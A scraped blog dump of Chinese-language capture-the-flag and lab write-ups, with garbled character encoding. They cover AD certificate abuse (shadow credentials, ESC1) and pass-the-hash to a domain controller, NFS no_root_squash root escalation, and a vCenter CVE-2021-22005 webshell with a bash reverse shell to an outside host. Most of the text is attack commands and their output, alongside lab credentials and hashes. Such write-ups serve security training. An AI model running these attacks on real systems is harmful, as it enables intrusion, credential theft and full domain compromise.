C:\\Users\\hyh\\Desktop dir ç›®å½•: C:\\Users\\hyh\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----a---- 9/9/2025 9:28 PM 34 user.txt rootflagè¿™é‡Œç”¨bloodhoundè·å–ä¿¡æ¯ bloodhound-python -u hyh -p 3948571026 -d confidence.com -ns 192.168.10.132 -c All --zipINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)INFO: Found AD domain: confidence.comINFO: Getting TGT for userINFO: Connecting to LDAP server: dc.confidence.comINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 1 computersINFO: Connecting to LDAP server: dc.confidence.comINFO: Found 7 usersINFO: Found 53 groupsINFO: Found 2 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: dc.confidence.comINFO: Done in 00M 00SINFO: Compressing output into 20250911042039_bloodhound.zipæ”¾åˆ°é‡Œé¢ å‘é€hyhå¯¹ca-userç”¨æˆ·æœ‰å¯å†™æƒé™ç›´æ¥å¯ä»¥è·å–ä»–çš„hash é€šè¿‡å½±å­å‡­è¯ å½±å­å‡­è¯certipy shadow auto -username hyh@confidence.com -password 3948571026 -account ca-user -target dc.confidence.com -dc-ip 192.168.10.132 source certipy-3.12-env/bin/activate æ¿€æ´»è™šæ‹Ÿç¯å¢ƒå·¥å…·è¦æ±‚3.11â””â”€# certipy shadow auto -username hyh@confidence.com -password 3948571026 -account ca-user -target dc.confidence.com -dc-ip 192.168.10.132Certipy v5.0.3 - by Oliver Lyak (ly4k)[*] Targeting user ca-user[*] Generating certificate[*] Certificate generated[*] Generating Key Credential[*] Key Credential generated with DeviceID 6105a628c72a4425ae02b84c3ed67080[*] Adding Key Credential with device ID 6105a628c72a4425ae02b84c3ed67080 to the Key Credentials for ca-user[*] Successfully added Key Credential with device ID 6105a628c72a4425ae02b84c3ed67080 to the Key Credentials for ca-user[*] Authenticating as ca-user with the certificate[*] Certificate identities:[*] No identities found in this certificate[*] Using principal: ca-user@confidence.com[*] Trying to get TGT...[*] Got TGT[*] Saving credential cache to ca-user.ccache[*] Wrote credential cache to ca-user.ccache[*] Trying to retrieve NT hash for ca-user[*] Restoring the old Key Credentials for ca-user[*] Successfully restored the old Key Credentials for ca-user[*] NT hash for ca-user: 8636734a8c71b741a33bcb2bf323ea5c è·å¾—äº†ca-userç„¶åä½¿ç”¨æ¼æ´æ‰«ææ‰«ææ¼æ´ â””â”€# certipy find -username ca-user -hashes :8636734a8c71b741a33bcb2bf323ea5c -dc-ip 192.168.10.132 -vulnerableCertipy v5.0.3 - by Oliver Lyak (ly4k)[*] Finding certificate templates[*] Found 35 certificate templates[*] Finding certificate authorities[*] Found 1 certificate authority[*] Found 12 enabled certificate templates[*] Finding issuance policies[*] Found 17 issuance policies[*] Found 0 OIDs linked to templates[*] Retrieving CA configuration for confidence-DC-CA via RRP[!] Failed to connect to remote registry. Service should be starting now. Trying again...[*] Successfully retrieved CA configuration for confidence-DC-CA[*] Checking web enrollment for CA confidence-DC-CA @ dc.confidence.com[!] Error checking web enrollment: timed out[!] Use -debug to print a stacktrace[!] Error checking web enrollment: timed out[!] Use -debug to print a stacktrace[*] Saving text output to 20250911052914_Certipy.txt[*] Wrote text output to 20250911052914_Certipy.txt[*] Saving JSON output to 20250911052914_Certipy.json[*] Wrote JSON output to 20250911052914_Certipy.jsoncat 20250911052914_Certipy.txt [+] User Enrollable Principals : CONFIDENCE.COM\\Domain Computers CONFIDENCE.COM\\ca-admin [!] Vulnerabilities ESC1 : Enrollee supplies subject and template allows client authentication.å‘ç°æ¼æ´ESC1 ESC11 â””â”€# certipy req -u ca-user@confidence.com -hashes :8636734a8c71b741a33bcb2bf323ea5c \\ -ca confidence-DC-CA -target dc.confidence.com \\ -template ca-login \\ -upn administrator@confidence.com \\ -sid S-1-5-21-3649830887-1815587496-1699028491-500 \\ -out administrator \\ -dc-ip 192.168.10.132Certipy v5.0.3 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Request ID is 10[*] Successfully requested certificate[*] Got certificate with UPN administrator@confidence.com[*] Certificate object SID is S-1-5-21-3649830887-1815587496-1699028491-500[*] Saving certificate and private key to administrator.pfxFile administrator.pfx already exists. Overwrite? (y/n - saying no will save with a unique filename): [*] Wrote certificate and private key to administrator_1abcd36f-ea00-404e-955c-50be33193359.pfxcertipy req\tcertipy çš„ â€œè¯ä¹¦è¯·æ±‚â€ å­å‘½ä»¤ï¼Œç”¨äºå‘åŸŸ CA ç”³è¯·è¯ä¹¦-u ca-user@confidence.com\tæŒ‡å®šç”¨äºè¯·æ±‚è¯ä¹¦çš„è´¦å·ï¼šåŸŸç”¨æˆ· ca-userï¼ˆUPN æ ¼å¼ï¼Œconfidence.com ä¸ºç›®æ ‡åŸŸï¼‰-hashes :8636734a8c71b741a33bcb2bf323ea5c\tæŒ‡å®š ca-user çš„ NTLM å“ˆå¸Œï¼ˆ: å‰ä¸ºç©ºè¡¨ç¤ºä¸ä½¿ç”¨ LM å“ˆå¸Œï¼Œä»…ç”¨ NT å“ˆå¸Œï¼›è¯¥å“ˆå¸Œæ˜¯ ca-user çš„èº«ä»½å‡­è¯ï¼Œæ— éœ€æ˜æ–‡å¯†ç ï¼‰-ca confidence-DC-CA\tæŒ‡å®šç›®æ ‡åŸŸçš„è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰åç§°ï¼šconfidence-DC-CAï¼ˆé€šå¸¸åŸŸæ§ä¼šä½œä¸º CAï¼Œæ ¼å¼ä¸º â€œåŸŸ - åŸŸæ§ - CAâ€ï¼‰-target dc.confidence.com\tæŒ‡å®šè¯ä¹¦è¯·æ±‚çš„ç›®æ ‡æœåŠ¡å™¨ï¼šåŸŸæ§ dc.confidence.comï¼ˆCA æœåŠ¡è¿è¡Œåœ¨åŸŸæ§ä¸Šï¼‰-template ca-login\tæŒ‡å®šç”¨äºè¯·æ±‚è¯ä¹¦çš„ â€œè¯ä¹¦æ¨¡æ¿â€ï¼šca-loginï¼ˆéœ€æ˜¯åŸŸå†…å¯ç”¨äºèº«ä»½è®¤è¯çš„æ¨¡æ¿ï¼Œä¸” ca-user æœ‰è¯¥æ¨¡æ¿çš„ç”³è¯·æƒé™ï¼‰-upn administrator@confidence.com\tå…³é”®ä¼ªé€ å‚æ•°ï¼šå°†è¯ä¹¦çš„ â€œç”¨æˆ·ä¸»ä½“åï¼ˆUPNï¼‰â€ è®¾ä¸º administrator@confidence.comï¼ˆå³ä¼ªè£…æˆåŸŸç®¡ç†å‘˜è´¦å·ï¼‰-sid S-1-5-21-...-500\tå…³é”®ä¼ªé€ å‚æ•°ï¼šå°†è¯ä¹¦å…³è”çš„ SID è®¾ä¸ºç®¡ç†å‘˜çš„ SIDï¼ˆ-500 æ˜¯åŸŸç®¡ç†å‘˜çš„é»˜è®¤ SIDï¼Œç¡®ä¿è¯ä¹¦è¢«è¯†åˆ«ä¸ºç®¡ç†å‘˜èº«ä»½ï¼‰-out administrator\tæŒ‡å®šè¾“å‡ºæ–‡ä»¶å‰ç¼€ï¼šç”Ÿæˆçš„è¯ä¹¦å’Œç§é’¥æ–‡ä»¶ä»¥ administrator å‘½å-dc-ip 192.168.10.132\tæŒ‡å®šåŸŸæ§çš„ IP åœ°å€ï¼šé¿å… DNS è§£æé—®é¢˜ï¼Œç›´æ¥é€šè¿‡ IP è¿æ¥åŸŸæ§ 2 è·å¾—NT hash â””â”€# certipy auth -pfx administrator_1abcd36f-ea00-404e-955c-50be33193359.pfx -dc-ip 192.168.10.132 Certipy v5.0.3 - by Oliver Lyak (ly4k)[*] Certificate identities:[*] SAN UPN: administrator@confidence.com[*] SAN URL SID: S-1-5-21-3649830887-1815587496-1699028491-500[*] Security Extension SID: S-1-5-21-3649830887-1815587496-1699028491-500[*] Using principal: administrator@confidence.com[*] Trying to get TGT...[*] Got TGT[*] Saving credential cache to administrator.ccacheFile administrator.ccache already exists. Overwrite? (y/n - saying no will save with a unique filename): [*] Wrote credential cache to administrator_3460f055-68bf-49c8-a389-5a8afc641fee.ccache[*] Trying to retrieve NT hash for administrator[*] Got hash for administrator@confidence.com: aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34certipy auth\tcertipy çš„ â€œè¯ä¹¦è®¤è¯â€ å­å‘½ä»¤ï¼Œç”¨äºé€šè¿‡ PFX è¯ä¹¦å®Œæˆ Kerberos è®¤è¯-pfx administrator_xxx.pfx\tæŒ‡å®šä¸Šä¸€æ­¥ç”Ÿæˆçš„ä¼ªé€ è¯ä¹¦æ–‡ä»¶ï¼ˆåŒ…å«ç®¡ç†å‘˜èº«ä»½çš„è¯ä¹¦å’Œç§é’¥ï¼‰-dc-ip 192.168.10.132\tç›´æ¥æŒ‡å®šåŸŸæ§ IPï¼Œç¡®ä¿é¡ºåˆ©è¿æ¥ å‘½ä»¤æ‰§è¡Œæµç¨‹ä¸ç»“æœï¼š è¯ä¹¦èº«ä»½éªŒè¯ï¼šcertipy è¯»å– PFX æ–‡ä»¶ä¸­çš„è¯ä¹¦ï¼Œå‘åŸŸæ§è¯æ˜ â€œè‡ªå·±æ˜¯ administratorâ€ï¼ˆå› è¯ä¹¦çš„ UPN å’Œ SID å‡ä¸ºç®¡ç†å‘˜ä¿¡æ¯ï¼‰ï¼› è·å– TGTï¼šåŸŸæ§éªŒè¯è¯ä¹¦æœ‰æ•ˆåï¼Œé¢å‘ â€œç¥¨è¯æˆäºˆç¥¨æ®ï¼ˆTGTï¼‰â€ï¼ˆç®¡ç†å‘˜æƒé™çš„ TGTï¼‰ï¼Œå¹¶ä¿å­˜ä¸º administrator_xxx.ccacheï¼ˆKerberos å‡­è¯ç¼“å­˜æ–‡ä»¶ï¼‰ï¼› æå–ç®¡ç†å‘˜å“ˆå¸Œï¼šåˆ©ç”¨ç®¡ç†å‘˜æƒé™çš„ TGTï¼Œè¿›ä¸€æ­¥ä»åŸŸæ§ä¸­è¯»å– administrator çš„ NT å“ˆå¸Œï¼Œæœ€ç»ˆè¾“å‡ºç»“æœï¼šaad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34 å…ˆåˆ©ç”¨ ca-user çš„æƒé™ï¼ˆå¯èƒ½æ˜¯ä¹‹å‰é€šè¿‡ GenericWrite è·å–çš„æƒé™ï¼‰ï¼Œç”³è¯·ä¸€å¼  â€œä¼ªè£…æˆç®¡ç†å‘˜â€ çš„è¯ä¹¦ï¼› å†ç”¨è¿™å¼ ä¼ªé€ è¯ä¹¦å®ŒæˆåŸŸè®¤è¯ï¼Œè·å–ç®¡ç†å‘˜æƒé™çš„ Kerberos å‡­è¯ï¼Œæœ€ç»ˆæå–å‡ºç®¡ç†å‘˜çš„ NT å“ˆå¸Œï¼› æ‹¿åˆ°ç®¡ç†å‘˜å“ˆå¸Œåï¼Œå¯è¿›ä¸€æ­¥é€šè¿‡ pass-the-hashï¼ˆå“ˆå¸Œä¼ é€’ï¼‰ç›´æ¥ç™»å½•åŸŸæ§ï¼Œå®ç°å®Œå…¨æ§åˆ¶ã€‚ ç™»å½• psexec.py administrator@192.168.10.132 -hashes aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34/usr/local/lib/python3.10/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. import pkg_resourcesImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on 192.168.10.132.....[*] Found writable share ADMIN$[*] Uploading file UTLKILTt.exe[*] Opening SVCManager on 192.168.10.132.....[*] Creating service bROc on 192.168.10.132.....[*] Starting service bROc.....[!] Press help for extra shell commands[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codecMicrosoft Windows [ï¿½æ±¾ 10.0.20348.4052][-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codec(c) Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½C:\\Windows\\system32 whoamint authority\\system","tags":["windows","ldap"]},{"title":"Mounté¶æœº-maze","path":"/2025/09/10/posts/mount/","content":"Mounté¶æœº-Maze ä¿¡æ¯æ”¶é›†NMAPæ‰«æç«¯å£ â””â”€# nmap 172.20.10.2 -sT -p- -sC Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-10 02:27 EDTNmap scan report for 172.20.10.2Host is up (0.00042s latency).Not shown: 65526 closed tcp ports (conn-refused)PORT STATE SERVICE22/tcp open ssh| ssh-hostkey: | 3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)| 256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)|_ 256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)79/tcp open finger| finger: \\x0D| Welcome to Linux version 4.19.0-27-amd64 at Mount !\\x0D| | 02:27:19 up 3 min, 0 users, load average: 0.04, 0.01, 0.00| \\x0D|_No one logged on.\\x0D80/tcp open http|_http-title: Site doesnt have a title (text/html).111/tcp open rpcbind| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 3 2049/udp nfs| 100003 3 2049/udp6 nfs| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100005 1,2,3 37701/udp mountd| 100005 1,2,3 45501/tcp6 mountd| 100005 1,2,3 48026/udp6 mountd| 100005 1,2,3 51187/tcp mountd| 100021 1,3,4 34593/tcp nlockmgr| 100021 1,3,4 43233/tcp6 nlockmgr| 100021 1,3,4 48578/udp nlockmgr| 100021 1,3,4 49562/udp6 nlockmgr| 100227 3 2049/tcp nfs_acl| 100227 3 2049/tcp6 nfs_acl| 100227 3 2049/udp nfs_acl|_ 100227 3 2049/udp6 nfs_acl2049/tcp open nfs_acl34593/tcp open nlockmgr35695/tcp open unknown51187/tcp open mountd60235/tcp open unknownMAC Address: 08:00:27:8D:16:16 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds NFS æœåŠ¡ï¼ˆ2049/111/51187 ç«¯å£ï¼‰ï¼šé«˜é£é™©NFSï¼ˆç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼‰æ˜¯æœ€éœ€å…³æ³¨çš„æœåŠ¡ï¼Œè‹¥é…ç½®ä¸å½“æ˜“å¯¼è‡´ æ–‡ä»¶æ³„éœ²æˆ–æœªæˆæƒè®¿é—®ï¼šé£é™©ï¼šè‹¥ NFS å…±äº«ç›®å½•æœªé™åˆ¶å®¢æˆ·ç«¯ IPã€æœªè®¾ç½®æƒé™ï¼ˆå¦‚ no_root_squash é…ç½®ï¼‰ï¼Œæ”»å‡»è€…å¯èƒ½æŒ‚è½½å…±äº«ç›®å½•ï¼Œè¯»å– / ä¿®æ”¹æ•æ„Ÿæ–‡ä»¶ï¼ˆå¦‚ç³»ç»Ÿé…ç½®ã€ç”¨æˆ·æ•°æ®ï¼‰ã€‚éªŒè¯å»ºè®®ï¼šæ‰§è¡Œ showmount -e 172.20.10.2ï¼ˆéœ€æœ¬åœ°å®‰è£… nfs-common å·¥å…·ï¼‰ï¼ŒæŸ¥çœ‹ NFS å…±äº«çš„ç›®å½•åŠæƒé™é…ç½®ã€‚ showmount -e 172.20.10.2 showmount -e 172.20.10.2Export list for 172.20.10.2:/home/ll104567 *å‘ç°å¯ä»¥æŒ‚è½½â€œå…è®¸æ‰€æœ‰å®¢æˆ·ç«¯è®¿é—®â€ çš„æ–¹å¼å…±äº«ï¼ˆ* è¡¨ç¤ºæ—  IP é™åˆ¶ï¼‰ æŒ‚è½½æ‹¿åˆ°ç”¨æˆ·shellmkdir -p /mnt/nfs_testmount -t nfs 172.20.10.2:/home/ll104567 /mnt/nfs_testcd nfs_test cd: æƒé™ä¸å¤Ÿ: nfs_test æç¤ºæƒé™ä¸å¤Ÿå°±åˆ›å»ºè¿™ä¸ªç”¨æˆ·è¿›å»æ”¾å…¥sshå¯†ç ç™»å½•useradd -u 6666 nfs_user mkdir .ssh echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChJ31EeTjZIw5tz/8b2Ma6XyrjI6+FSUfbnWRF7HA6/pMtgTbZGPhKXRzdigHq2NY40KSz7xpeDvpZEbdCjpCiimXfwgALaZpI/GxftyA4C9yWoSQxR7jdK8dWAurA9rnoPnwrOO8F14rg2P2vknrtR70eIklAwbuDvJ8Aq9Ai5tMPaiOx2uJAYRWYRgOd/jP4WhZ8nF88N+E963xFf/Bf37AMV4SVujvasubsmM96t7fOqEBgzyK+xTClVqhzzGKhcr5AfYDvemDnffXEC3Ff+cdkXpW8HhX8FrK6D2HzwpOIN/8hypJNkGssXOZ9E4rTWWoY84VtPvceYMUI7xV44VskmZMLYrBAxfPDzEJV/HHKX1xQXwsHg7WiSRntApPS3BfeMr8ZqJTSBqoTVAnoMAuClPy1Vm1c+mlzvjlCbBBLfLEWNvuslzR9rQMFpMwLN3PoBhyGZ5+gv94QPbicLhNuLdU10KD5dHLtWUoWIGOu2RqtcjjKul+fT62BPy8= root@kali authorized_keys$ ls -alæ€»ç”¨é‡ 12drwxrwxr-x 2 nfs_user nfs_user 4096 9æœˆ 10 02:33 .drwx------ 3 nfs_user nfs_user 4096 9æœˆ 10 02:32 ..-rw-rw-r-- 1 nfs_user nfs_user 563 9æœˆ 10 02:33 authorized_keys ç™»å½• æ‹¿åˆ°llç”¨æˆ· â””â”€# ssh ll104567@172.20.10.2 -i /root/.ssh/id_rsa Linux Mount 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Aug 20 23:46:24 2025 from 192.168.3.94ll104567@Mount:~$ ll104567@Mount:~$ lsll104567@Mount:~$ ls -al è¿™é‡Œå‘ç°è¿˜æœ‰ä¸ªç”¨æˆ·guestçˆ†ç ´å¾—åˆ°å¯†ç lalalaè·å¾—user.txt [22][ssh] host: 172.20.10.2 login: guest password: lalala ææƒrootè¿™é‡Œå‘ç°å¯ä»¥é‡å¯å¹¶ä¸”æˆ‘ä»¬å¯¹exportsè¿™NFCå…³é”®æ–‡ä»¶å¯ä»¥å†™å°±å¯ä»¥è¿ç”¨æ¥ææƒ l104567@Mount:~$ sudo -lMatching Defaults entries for ll104567 on Mount: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser ll104567 may run the following commands on Mount: (ALL) NOPASSWD: /sbin/reboot ll104567@Mount:~$ ls -al /etc/exports -rw-rw---- 1 root ll104567 49 Sep 10 04:03 /etc/exportsll104567@Mount:~$ ä¿®æ”¹æ–‡ä»¶å†…å®¹ä¸º /root *(rw,sync,no_root_squash,no_subtree_check) sudo sbinreboot å°±ä¼šåº”ç”¨é…ç½®ç„¶åæˆ‘ä»¬é‡æ–°æŒ‚è½½ â”Œâ”€â”€(rootã‰¿kali)-[/mnt/nfs_test2]â””â”€# showmount -e 172.20.10.2Export list for 172.20.10.2:/root *mkdir -p /mnt/nfs_test3 â”Œâ”€â”€(rootã‰¿kali)-[/mnt/nfs_test2]â””â”€# mount -t nfs 172.20.10.2:/home/ll104567 /mnt/nfs_test3Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service â†’ /usr/lib/systemd/system/rpc-statd.service.mount.nfs: mounting 172.20.10.2:/home/ll104567 failed, reason given by server: No such file or directory â”Œâ”€â”€(rootã‰¿kali)-[/mnt/nfs_test2]â””â”€# mount -t nfs 172.20.10.2:/root /mnt/nfs_test3 â”Œâ”€â”€(rootã‰¿kali)-[/mnt/nfs_test2]â””â”€# cd /mnt/nfs_test3 â”Œâ”€â”€(rootã‰¿kali)-[/mnt/nfs_test3]â””â”€# ls root.txt","tags":["mountnfs","mount"]},{"title":"vmware-esxi-vscenter-é¶åœºvulntarget-o","path":"/2025/09/04/posts/vmwareesxivscenter/","content":"vmware-esxi-vscenter-é¶åœºvulntarget-o https://pan.baidu.com/s/1sv9qdioNF4PTUliix5HEfgæå–ç : 2dwq ä¸‹è½½é¶åœº WP é¶æœºWP å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-è®°ä¸€æ¬¡æ”»é˜²æ¼”ç»ƒä¹‹vcenteråæ¸—é€åˆ©ç”¨ å®‰è£…é…ç½®ESXi æ˜¯ VMware çš„è£¸é‡‘å±è™šæ‹ŸåŒ– hypervisorï¼ˆç›´æ¥å®‰è£…åœ¨ç‰©ç†æœåŠ¡å™¨ç¡¬ä»¶ä¸Šï¼‰ï¼Œæ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ›å»ºã€è¿è¡Œå’Œç®¡ç†è™šæ‹Ÿæœºï¼›vCenter Server æ˜¯é›†ä¸­ç®¡ç†å¹³å°ï¼Œç”¨äºç»Ÿä¸€ç®¡æ§å¤šå° ESXi ä¸»æœºåŠä¸Šé¢çš„æ‰€æœ‰è™šæ‹Ÿæœºï¼Œå®ç°è§„æ¨¡åŒ–è¿ç»´ã€‚ è¿™ä¸ªé¶æœºç›¸å½“äºåœ¨ä¸€ä¸ªä¸»æœºé‡Œé¢åˆ›å»ºäº†ä¸¤ä¸ªè™šæ‹Ÿæœº æ”»å‡»ä»–çš„vxcenterç›¸å½“äºæ‹¿åˆ°äº†å ¡å’æœºè¿›è¡Œè·³æ¿ å°±å’Œé˜¿é‡Œäº‘çš„é¢æ¿ç›¸ä¼¼ è®¾ç½®ä¸ºNATæ¨¡å¼ è®¾ç½®ç½‘æ®µä¸º10 æ‰“å¼€é…ç½® å¯åŠ¨è™šæ‹Ÿæœº ç›¸å…³å¯†ç  esxi ï¼š192.168.10.128 è¿›å…¥åå¯åŠ¨PC vcenterå’Œwin7 â— è´¦å·ï¼šroot â— å¯†ç ï¼šVulntarget@123 vcenterï¼š192.168.10.129 â— è´¦å·ï¼šadministrator@vsphere.local â— å¯†ç ï¼šAdmin@vulntarget123 Windows7ï¼š192.168.10.***ï¼ˆdhcpï¼‰** â— è´¦å·ï¼švulntarget â— å¯†ç ï¼šVulntarget https://192.168.10.129/è®¿é—®åå¯åŠ¨å®¢æˆ·ç«¯ æ¸—é€æµ‹è¯•è¿™ç§é¢æ¿å°±å’Œé˜¿é‡Œçš„ä¸€æ ·ç‚¹å‡»ç”»é¢å°±è¿›å»äº†å¯ä»¥æ“ä½œ å‘ç°äº†vcenterå®¢æˆ·ç«¯ cve-2021-22005ä½¿ç”¨cve-2021-22005-exp-mainæ¥ä¸€ä¸ªå“¥æ–¯æ‹‰åé—¨python exp.py -s 11.jsp -t https://192.168.10.129/[*] target: https://192.168.10.129[*] webshell: 11.jsp[*] creating agent[*] uploading manifest[!] webshell url: https://192.168.10.129/idm/..;/tgpz9j.jspè‡ªåŠ¨ç”Ÿæˆpayloadå“¥æ–¯æ‹‰è¿æ¥webshellæ˜¯æ²¡æœ‰äº¤äº’çš„ åå¼¹ä¸ªshellæ¥bash -i /dev/tcp/192.168.10.1/6666 01 åå¼¹SHELLnc -lvvp 6666listening on [any] 6666 ...192.168.10.129: inverse host lookup failed: h_errno 11004: NO_DATAconnect to [192.168.10.1] from (UNKNOWN) [192.168.10.129] 35096: NO_DATAbash: cannot set terminal process group (1747): Inappropriate ioctl for devicebash: no job control in this shellwhoamiroot é‡ç½®vcenterå¯†ç  è¿™ä¸ªä¸æ¨è å¯ä»¥çœ‹ä¸Šé¢é‚£ä¸ªç¤¾åŒºå…¶ä»–æ”»å‡»æ–¹æ³• usrlibvmware-vmdirbinvdcadmintool é‡ç½®å¯†ç  Please enter account UPN : administrator@vsphere.local==================Please select:0. exit1. Test LDAP connectivity2. Force start replication cycle3. Reset account password4. Set log level and mask5. Set vmdir state6. Get vmdir state7. Get vmdir log level and mask==================New password is -qx[cKy5r@0-OP+pXw@ æ‹¿åˆ°å¯†ç ç™»å½• è¿›å…¥VCENTERè¿›å…¥åæˆ‘ä»¬è¦æ‹¿ä¸‹è¿™ä¸ªwin7å¯ä»¥ä¸Šä¼ æ¶æ„çš„isoé•œåƒæ¥è¾¾æˆ-ä½¿ç”¨å…‹éš†è™šæ‹Ÿæœº VMware vSphere Client ç¯å¢ƒä¸‹å…‹éš†çš„è™šæ‹Ÿæœºä¸éœ€è¦æœ¬æœºå¯åŠ¨å°±èƒ½å¯åŠ¨ï¼Œæ˜¯å› ä¸ºè™šæ‹Ÿæœºæœ¬èº«å…·å¤‡ç›¸å¯¹ç‹¬ç«‹æ€§ å…ˆä¸Šä¼ åˆ°æ•°æ®åº“ä¸­ kon-bootCD.iso å†å…‹éš† é€‰ä¸­è‡ªå®šä¹‰ é€‰ä¸­é•œåƒ å»æ‰ç½‘ç»œé¿å…å†²çª å¼ºåˆ¶è¿›å…¥bios å¯åŠ¨ä¹‹åï¼Œåœ¨biosç•Œé¢ï¼Œä½¿ç”¨+-ç¬¦å·æ¥ç§»åŠ¨é¡ºåºï¼Œmacä¸Šåªèƒ½ç”¨-æ¥ç§»åŠ¨ï¼Œå°†cdä½œä¸ºç¬¬ä¸€ä¸ªï¼Œç„¶åf10ä¿å­˜å³å¯ è¿›å…¥ç™»å½•ç•Œé¢æŒ‰5ä¸‹shift é»˜è®¤systemæƒé™ net user admin33 admin33 /add è´¦å·admin33 å¯†ç admin33net localgroup administrators admin33 /add å°†æ–°åˆ›å»ºçš„ç”¨æˆ· admin33 æ·»åŠ åˆ° ç®¡ç†å‘˜ç»„ï¼ˆadministratorsï¼‰","tags":["vmware","esxi","vscenter"]},{"title":"poppips-mazasec","path":"/2025/09/03/posts/poppips-mazasec/","content":"poppips-mazasec-wp ç«¯å£æ‰«ænmapæ‰«æ: å‘ç°110 995 é‚®ä»¶ç«¯å£ -sV ç‰ˆæœ¬æ¢æµ‹ -sC è„šæœ¬æ‰«æâ””â”€# nmap 172.20.10.2 -sV -sCStarting Nmap 7.92 ( https://nmap.org ) at 2025-09-03 02:47 EDTNmap scan report for interstellar.dsz (172.20.10.2)Host is up (0.000066s latency).Not shown: 996 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)| ssh-hostkey: | 3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)| 256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)|_ 256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)80/tcp open http Apache httpd 2.4.62 ((Debian))|_http-title: Mary Poppins - A Timeless Classic|_http-server-header: Apache/2.4.62 (Debian)110/tcp open pop3 Dovecot pop3d|_pop3-capabilities: RESP-CODES UIDL SASL(PLAIN) AUTH-RESP-CODE USER PIPELINING TOP STLS CAPA| ssl-cert: Subject: commonName=PyCrt.PyCrt| Subject Alternative Name: DNS:PyCrt.PyCrt| Not valid before: 2025-04-01T14:05:29|_Not valid after: 2035-03-30T14:05:29|_ssl-date: TLS randomness does not represent time995/tcp open ssl/pop3 Dovecot pop3d|_pop3-capabilities: USER SASL(PLAIN) RESP-CODES UIDL CAPA TOP AUTH-RESP-CODE PIPELINING| ssl-cert: Subject: commonName=PyCrt.PyCrt| Subject Alternative Name: DNS:PyCrt.PyCrt| Not valid before: 2025-04-01T14:05:29|_Not valid after: 2035-03-30T14:05:29|_ssl-date: TLS randomness does not represent timeMAC Address: 08:00:27:B7:B0:C2 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.47 seconds æ²¡å‘ç°ä»€ä¹ˆç‰¹åˆ«çš„ ç›®å½•æ‰«ææˆ‘ä»¬Dirsearchä¸‹ [02:49:32] Starting: [02:49:32] 403 - 276B - /.ht_wsr.txt [02:49:32] 403 - 276B - /.htaccess.bak1 [02:49:32] 403 - 276B - /.htaccess.sample [02:49:32] 403 - 276B - /.htaccess.orig[02:49:32] 403 - 276B - /.htaccess.save [02:49:32] 403 - 276B - /.htaccess_sc [02:49:32] 403 - 276B - /.htaccess_extra[02:49:32] 403 - 276B - /.htaccess_orig[02:49:32] 403 - 276B - /.htaccessOLD[02:49:32] 403 - 276B - /.htaccessBAK [02:49:32] 403 - 276B - /.htaccessOLD2[02:49:32] 403 - 276B - /.htm[02:49:32] 403 - 276B - /.html [02:49:32] 403 - 276B - /.htpasswds [02:49:32] 403 - 276B - /.htpasswd_test [02:49:32] 403 - 276B - /.httr-oauth[02:49:33] 403 - 276B - /.php [02:49:50] 301 - 306B - /s - http://172.20.10.2/s/ æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªs ä¸€èˆ¬è¿™æ—¶å€™çœ‹å‡ºæ¥æ˜¯åµŒå¥—çš„URL å°±ç”¨dirbè‡ªåŠ¨æ·±åº¦æ¢æµ‹ [02:49:50] 403 - 276B - /server-status/ [02:49:50] 403 - 276B - /server-status Dirbæ¢æµ‹ dirb 